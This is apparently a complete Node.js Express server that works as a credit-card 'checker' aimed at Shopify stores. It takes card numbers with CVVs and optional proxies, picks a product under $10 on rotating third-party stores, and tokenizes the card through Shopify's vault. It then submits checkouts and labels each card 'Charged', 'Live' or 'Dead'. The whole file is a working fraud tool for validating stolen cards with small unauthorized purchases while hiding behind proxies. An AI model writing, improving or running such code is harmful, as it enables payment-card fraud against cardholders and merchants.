const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Multi-Site Real Gateway API Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, sitesList, proxy } = req.body;

    if (!card) {
        return res.json({ status: "Dead", message: "Missing card data", gateway: "Shopify Payments", price: "-" });
    }

    // Build array of sites to try (supports single site or rotating list array)
    let candidateSites = [];
    if (sitesList && Array.isArray(sitesList) && sitesList.length > 0) {
        candidateSites = sitesList.sort(() => 0.5 - Math.random()); // shuffle
    } else if (site) {
        candidateSites = [site];
    } else {
        return res.json({ status: "Dead", message: "No target sites provided", gateway: "Shopify Payments", price: "-" });
    }

    const [ccNo, expMonth, expYear, cvv] = card.split('|');

    let agent = null;
    if (proxy) {
        let pClean = proxy.trim();
        let proxyUrl = pClean;
        if (!pClean.includes('://')) {
            const parts = pClean.split(':');
            if (parts.length === 4) {
                proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
            } else if (parts.length === 2) {
                proxyUrl = `http://${parts[0]}:${parts[1]}`;
            } else {
                proxyUrl = `http://${pClean}`;
            }
        }
        if (proxyUrl.startsWith('socks')) {
            agent = new SocksProxyAgent(proxyUrl);
        } else {
            agent = new HttpsProxyAgent(proxyUrl);
        }
    }

    let lastErrorMsg = "Store Offline or Proxy Blocked";
    let testedSitesCount = 0;

    // Loop through candidate sites until we find one with a product under $10 that responds
    for (const targetSite of candidateSites) {
        if (testedSitesCount >= 5) break; // limit max site attempts per request
        testedSitesCount++;

        try {
            const cleanSite = targetSite.replace(/\/$/, '');
            let cookies = '';
            
            const customFetch = async (url, options = {}) => {
                options.headers = options.headers || {};
                if (cookies) options.headers['Cookie'] = cookies;
                if (agent) options.agent = agent;
                
                const response = await fetch(url, options);
                const setCookie = response.headers.raw()['set-cookie'];
                if (setCookie) {
                    cookies = setCookie.map(c => c.split(';')[0]).join('; ');
                }
                return response;
            };

            const baseHeaders = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            };

            // 1. Fetch products
            const prodRes = await customFetch(`${cleanSite}/products.json?limit=50`, { headers: baseHeaders, timeout: 10000 });
            if (!prodRes.ok) continue;

            const prodData = await prodRes.json();
            if (!prodData.products || prodData.products.length === 0) continue;

            // Find a product variant strictly under $10
            let selectedVariantId = null;
            let selectedPrice = null;

            for (const product of prodData.products) {
                for (const variant of product.variants) {
                    const pValue = parseFloat(variant.price);
                    if (pValue > 0 && pValue <= 10.00 && variant.available !== false) {
                        selectedVariantId = variant.id;
                        selectedPrice = pValue;
                        break;
                    }
                }
                if (selectedVariantId) break;
            }

            // If this store doesn't have an item under $10, skip to the next site in the loop
            if (!selectedVariantId) {
                lastErrorMsg = "Skipped: No products under $10 on store";
                continue;
            }

            const formattedPrice = `$${selectedPrice.toFixed(2)}`;

            // 2. Add product to cart
            const cartAdd = await customFetch(`${cleanSite}/cart/add.js`, {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: selectedVariantId, quantity: 1 }),
                timeout: 10000
            });

            if (!cartAdd.ok) continue;

            // 3. Tokenize card via Shopify Vault
            const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': baseHeaders['User-Agent']
                },
                body: JSON.stringify({
                    credit_card: {
                        number: ccNo,
                        month: expMonth,
                        year: expYear,
                        name: "Valued Customer",
                        verification_value: cvv
                    }
                }),
                timeout: 10000
            });
            const vaultData = await vaultRes.json();

            if (!vaultData.id) {
                return res.json({ status: "Dead", message: "Card Format Invalid / Declined", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
            }

            // 4. Submit Payment Session & Extract Real Gateway Message
            const paymentPayload = {
                step: 'payment',
                s: vaultData.id,
                checkout: { credit_card: { vault_id: vaultData.id } }
            };

            const paySubmit = await customFetch(`${cleanSite}/checkout`, {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                body: JSON.stringify(paymentPayload),
                timeout: 12000
            });

            const respText = await paySubmit.text();
            
            // Try to extract real error message from HTML/JSON response text if present
            let realGatewayError = "Declined by Processor";
            try {
                if (respText.includes('error') || respText.includes('notice')) {
                    // Match common Shopify error notice containers
                    const matchError = respText.match(/class="notice__content"[^>]*>([^<]+)</i) || respText.match(/class="error-message"[^>]*>([^<]+)</i);
                    if (matchError && matchError[1]) {
                        realGatewayError = matchError[1].trim();
                    }
                }
            } catch (e) {}

            if (respText.includes('thank_you') || respText.includes('Order Success')) {
                return res.json({ status: "Charged", message: "Approved / Successfully Charged", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
            } else if (respText.includes('insufficient_funds')) {
                return res.json({ status: "Approved", message: "Live / Insufficient Funds", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
            } else if (respText.includes('incorrect_cvc') || respText.includes('security code')) {
                return res.json({ status: "Approved", message: "Live / Security Code Incorrect (CCN Live)", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
            } else {
                return res.json({ status: "Dead", message: realGatewayError, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
            }

        } catch (err) {
            lastErrorMsg = err.message;
            continue; // try next site
        }
    }

    return res.json({ status: "Dead", message: `All sites checked failed: ${lastErrorMsg}`, gateway: "Shopify Payments", price: "-" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API running on port ${PORT}`));